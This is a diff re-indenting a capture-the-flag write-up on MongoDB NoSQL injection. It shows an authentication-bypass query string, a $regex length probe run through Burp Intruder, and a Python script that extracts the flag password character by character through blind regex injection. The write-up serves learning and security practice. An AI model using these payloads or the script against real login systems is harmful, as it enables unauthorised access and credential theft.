@@ -56,71 +56,73 @@ MongoDB is a NoSQL Database which uses JSON Object similar syntax to store data 
 If the request body is encoded as JSON and the password is changed from a string to a query expression that evaluates to true, the password check becomes irrelevant and an attacker can authenticate themself as any user.
 
 - Validating NoSQL injection
-Sending the following query string as the NodeJS module `qs` parses the query string to the JSON and we have injection validated
 
-```
-username[$eq]=admin&password[$ne]=1
-```
+	Sending the following query string as the NodeJS module `qs` parses the query string to the JSON and we have injection validated
 
-<img src="./image/Pasted image 20220224064240.png" alt="injection" width="500"/>
+	```
+	username[$eq]=admin&password[$ne]=1
+	```
+
+	<img src="./image/Pasted image 20220224064240.png" alt="injection" width="500"/>
 
 - Guess the legth of password
-As the flag is the password and we have to sort of perform a brutforce to extract the password.
 
-\$regex will be used to perform regular expression search ```password[$regex]=.{n} ```, where n is the +ive number.  
-.{n} will match to all the value till the length of the password and after that return error.
+	As the flag is the password and we have to sort of perform a brutforce to extract the password.
 
-Using Burp intruder
+	\$regex will be used to perform regular expression search ```password[$regex]=.{n} ```, where n is the +ive number.  
+	.{n} will match to all the value till the length of the password and after that return error.
 
-<img src="./image/Pasted image 20220224065002.png" alt="burp" width="500"/>
+	Using Burp intruder
 
-The response leght after 45 is 233 which means password length in 45 characters.
+	<img src="./image/Pasted image 20220224065002.png" alt="burp" width="500"/>
 
-<img src="./image/Pasted image 20220224065122.png" alt="inturder" width="500"/>
+	The response leght after 45 is 233 which means password length in 45 characters.
+
+	<img src="./image/Pasted image 20220224065122.png" alt="inturder" width="500"/>
 
 - Retrieving flag
 
-The flag will be in format knox{XXXXXXXXXXXXX}, these are 6 characters and total lenght of password is 45 thus 39 character left.
+	The flag will be in format knox{XXXXXXXXXXXXX}, these are 6 characters and total lenght of password is 45 thus 39 character left.
 
-Using `$regex`  we can retrieve the password as well.
-```username=admin&password[$regex]=knox\{a.*```
-The regex will return true if first character in braces is a and anything after that, thus we use the same logic in our code.
+	Using `$regex`  we can retrieve the password as well.
+	```username=admin&password[$regex]=knox\{a.*```
+	The regex will return true if first character in braces is a and anything after that, thus we use the same logic in our code.
 
-<img src="./image/pass.gif" alt="script" width="500"/>
+	<img src="./image/pass.gif" alt="script" width="500"/>
 
-```Python
-#!/usr/bin/python3  
-import re  
-import requests  
-  
-def main():  
-	url = 'http://:9000/api/login'
-	proxy= {  
-	'http': 'http://127.0.0.1:8080'
-	}
-	headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}  
-	fail_msg = re.compile('Failed')  
-	flag = "knox\{"  
-	mydata = "username=admin&password[$regex]="  
-	alphabates= ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','_','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+	```Python
+	#!/usr/bin/python3  
+	import re  
+	import requests  
+	  
+	def main():  
+		url = 'http://:9000/api/login'
+		proxy= {  
+		'http': 'http://127.0.0.1:8080'
+		}
+		headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}  
+		fail_msg = re.compile('Failed')  
+		flag = "knox\{"  
+		mydata = "username=admin&password[$regex]="  
+		alphabates= ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','_','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 
-	print("Starting printing flag")  
+		print("Starting printing flag")  
 
-	for r in range(39):  
-		for i in alphabates:  
-			postdata = mydata+flag+i+'.*'  
-			#print(postdata)  
-			res=requests.post(url,headers=headers,data = postdata,proxies=proxy)  
-			checkresp = re.search('Failed',res.text)  
-			if (checkresp):  
-			#print('wrong')  
-				pass  
-			else:  
-				flag=flag+i  
-				print(flag,end='\r')  
-				break  
-				print(flag+'\}')  
-  
-if __name__ == '__main__':  
-	main()
-```
+		for r in range(39):  
+			for i in alphabates:  
+				postdata = mydata+flag+i+'.*'  
+				#print(postdata)  
+				res=requests.post(url,headers=headers,data = postdata,proxies=proxy)  
+				checkresp = re.search('Failed',res.text)  
+				if (checkresp):  
+				#print('wrong')  
+					pass  
+				else:  
+					flag=flag+i  
+					print(flag,end='\r')  
+					break  
+					print(flag+'\}')  
+	  
+	if __name__ == '__main__':  
+		main()
+	```
